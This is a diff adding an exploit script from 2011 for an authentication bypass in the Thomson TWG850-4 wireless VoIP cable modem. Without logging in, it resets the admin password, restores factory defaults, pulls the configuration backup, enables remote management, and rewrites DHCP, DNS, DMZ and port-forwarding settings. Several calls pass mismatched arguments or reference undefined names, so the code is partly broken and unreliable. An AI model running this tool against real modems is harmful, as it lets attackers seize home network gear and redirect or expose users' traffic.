@@ -1,0 +1,148 @@
+# Exploit Title: Thomson Wireless VoIP Cable Modem Auth Bypass
+# Date: February 22, 2011
+# Author(s): Glafkos Charalambous, George Nicolaou
+# Product: TWG850-4 Wireless VoIP Cable Modem
+# Software Version: ST9A.01.06
+# Severity: High
+# Other Vulnerabilities: 
+# Unauthenticated Backup File Access, 
+# Plaintext Protocol succeptible to sniffing attacks
+
+import argparse
+import httplib
+import urllib
+import urllib2
+
+def http_post( ip, port, request, params ):
+    headers = {
+        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language":"en-us;en;q=0.5",
+        "Accept-Encoding":"gzip, deflate",
+        "Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+        "Keep-Alive":"115",
+        "Connection":"keep-alive",
+        "Content-type":"application/x-www-form-urlencoded"
+        }
+    con = httplib.HTTPConnection(ip,port)
+    con.request("POST", request, params, headers)
+    response = con.getresponse()
+
+def block_domain( ip, port, host ):
+    http_post( ip,port,
+	       "/goform/RgUrlBlock",
+               urllib.urlencode( {"cbDomainBlocking":"0x2","BasicParentalNewKeyword":0, "BasicParentalKeywordAction":0, "BasicParentalDomainList":0, "BasicParentalNewDomain":host,"BasicParentalDomainAction":1} )
+               )
+def block_keyword( ip, port, host ):
+    http_post( ip,port,
+	       "/goform/RgUrlBlock",
+               urllib.urlencode( {"cbKeywordBlocking":"0x1", "BasicParentalNewKeyword":host,"BasicParentalKeywordAction":1, "BasicParentalNewDomain":"0", "BasicParentralDomainAction":0} )
+               )
+        
+def password_reset( ip, port, user="admin", passwd="admin" ):
+    http_post(ip,port,
+              "/goform/RgSecurity",
+              urllib.urlencode({"HttpUserId":user, "Password":passwd, "PasswordReEnter":passwd, "RestoreFactoryYes":"0x00" })
+              )
+
+def factory_defaults( ip, port, user="admin", passwd="admin" ):
+    http_post(ip,port,
+              "/goform/RgSecurity",
+              urllib.urlencode({"HttpUserId":user, "Password":passwd, "PasswordReEnter":passwd, "RestoreFactoryYes":"0x01" })
+              )
+
+def dhcp_config( ip, port, localip="10.1.0.1", localsub="255.255.255.0", leasepoolstart="10.1.0.10", leasepoolend="10.1.0.100" ):
+    http_post(ip,port,
+              "/goform/RgSetup",
+              urllib.urlencode({"LocalIpAddressIP":localip, "LocalSubnetMask":localsub, "DhcpServerEnable":"0x1000", "DhcpLeasePoolStartLAN":leasepoolstart, "DhcpLeasePoolEndLAN":leasepoolend, "LeaseTime":"604800" })
+              )
+
+def dyn_dns( ip, port, dnsuser="user", dnspass="pass", dnshost="host.dyndns.org" ):
+    http_post(ip,port,
+              "/goform/RgDdns",
+              urllib.urlencode({"DdnsService":1, "DdnsUserName":dnsuser, "DdnsPassword":dnspass, "DdnsHostName":dnshost })
+              )
+
+def sntp_set( ip, port, server1="clock.via.net", tserver2="ntp.nasa.gov", tserver3="tick.ucla.edu" ):
+    http_post(ip,port,
+              "/goform/RgTime",
+              urllib.urlencode({"TimeSntpEnable":1, "TimeServer1":tserver1, "TimeServer2":tserver2, "TimeServer3":tserver3, "TimeZoneOffsetHrs":0, "TimeZoneOffsetMins":0, "ResetSntpDefaults":0 })
+              )
+
+def backup_config( ip, port, fName="GatewaySettings.bin" ):
+    u = urllib2.urlopen('http://' + ip+":"+port + '/GatewaySettings.bin')
+    lFile = open(fName, 'w')
+    print "File "+fName+" saved successfully"
+    lFile.write(u.read())
+    lFile.close()
+
+def remote_manage( ip, port, status ):
+   if status == 'enable':
+    http_post(ip,port,
+	      "/goform/RgOptions",
+              urllib.urlencode({"cbIpsecPassThrough":"0x20", "cbPptpPassThrough":"0x40", "cbRemoteManagement":"0x80", "cbOptMulticast": "0x20000", "cbOptUPnP":"0x200000", "cbOptNatSipAlg":"0x89"})
+              )	
+   elif status == 'disable':
+    http_post(ip,port,
+              "/goform/RgOptions",
+              urllib.urlencode({"cbIpsecPassThrough":"0x20", "cbPptpPassThrough":"0x40", "cbOptMulticast": "0x20000", "cbOptUPnP":"0x200000", "cbOptNatSipAlg":"0x89"})
+              )
+   else:
+    print "The argument you specified is not accepted"
+
+def dmz_set( ip, port, dmzhost ):
+    http_post(ip,port,
+              "/goform/RgDmzHost",
+              urllib.urlencode({"DmzHostIP3":dmzhost})
+              )
+
+def port_forward( ip, port, localip, startport, endport ):
+    http_post(ip,port,
+              "/goform/RgForwarding",
+              urllib.urlencode({"PortForwardAddressLocal1IP3":localip, "PortForwardPortGlobalStart1":startport , "PortForwardPortGlobalEnd1":endport , "PortForwardProtocol1":"254", "PortForwardEnable1":"0x01"  })
+              )
+
+def main():
+   status = ['enable', 'disable']
+   argp = argparse.ArgumentParser(description='Thomson Cable Modem Auth Bypass v0.1')
+   argp.add_argument("-pr", "--password_reset", nargs=2, help="Reset Admin Account", metavar=("user","pass"))
+   argp.add_argument("-fd", "--factory_default", nargs=2, help="Reset Factory Defaults", metavar=("user","pass"))
+   argp.add_argument("-bk", "--block_keyword", help="Block Web Access based on Keyword(s)", metavar="keywrd1,keywrd2,...,keywrdN")
+   argp.add_argument("-bd", "--block_domain", help="Block Web Access to Specific Domain(s)",metavar="domain1,domain2,...,domainN")
+   argp.add_argument("-dc", "--dhcp_config", nargs=4, help="Configure DHCP Settings",metavar=("localip","localsub","leasepoolstart", "leasepoolend"))
+   argp.add_argument("-dd", "--dyn_dns", nargs=3, help="Configure Dynamic DNS",metavar=("user", "pass", "host"))
+   argp.add_argument("-ss", "--sntp_set", nargs=3, help="Configure SNTP Settings",metavar=("timeserver1", "timeserver2", "timeserver3"))
+   argp.add_argument("-bg", "--backup_config", help="Download Backup Configuration", metavar=("filename"))
+   argp.add_argument("-rm", "--remote_manage", help="Enable Remote Config Management", metavar=("enable/disable"))
+   argp.add_argument("-ds", "--dmz_set", help="Set DMZ Host. Use last 3 digits for IP Address", metavar=("ip"))
+   argp.add_argument("-pf", "--port_forward", nargs=3, help="Configure Port Forwarding", metavar=("ip", "startport", "endport"))
+   argp.add_argument("IP", help="IP Address")
+   argp.add_argument("PORT", help="Port Number")
+   args = argp.parse_args()
+   if(args.password_reset != None):
+       password_reset( args.IP, args.password_reset[0], args.password_reset[1] )
+   if(args.factory_default != None):
+       factory_default( args.IP, args.factory_default[0], args.factory_default[1] )
+   if(args.block_keyword != None):
+       for keyword in args.block_keyword.split(","):
+           block_keyword(args.IP, keyword)
+   if(args.block_domain != None):
+        for domain in args.block_domain.split(","):
+            block_domain( args.IP, domain )
+   if(args.dhcp_config != None):
+       dhcp_config( args.IP, args.dhcp_config[0], args.dhcp_config[1], args.dhcp_config[2], args.dhcp_config[3] )
+   if(args.dyn_dns != None):
+       dyn_dns( args.IP, args.dyn_dns[0], args.dyn_dns[1], args.dyn_dns[2] )
+   if(args.sntp_set != None):
+       sntp_set( args.IP, args.sntp_set[0], args.sntp_set[1], args.sntp_set[2] )
+   if(args.backup_config != None):
+       backup_config( args.IP, args.backup_config )
+   if(args.remote_manage != None):
+       remote_manage( args.IP, args.PORT, args.remote_manage )
+   if(args.dmz_set != None):
+       dmz_set( args.IP, args.PORT, int( args.dmz_set ))
+   if(args.port_forward != None):
+       port_forward( args.IP, args.PORT, args.port_forward[0], args.port_forward[1], args.port_forward[2] )
+ 
+if __name__ == "__main__":
+    main()
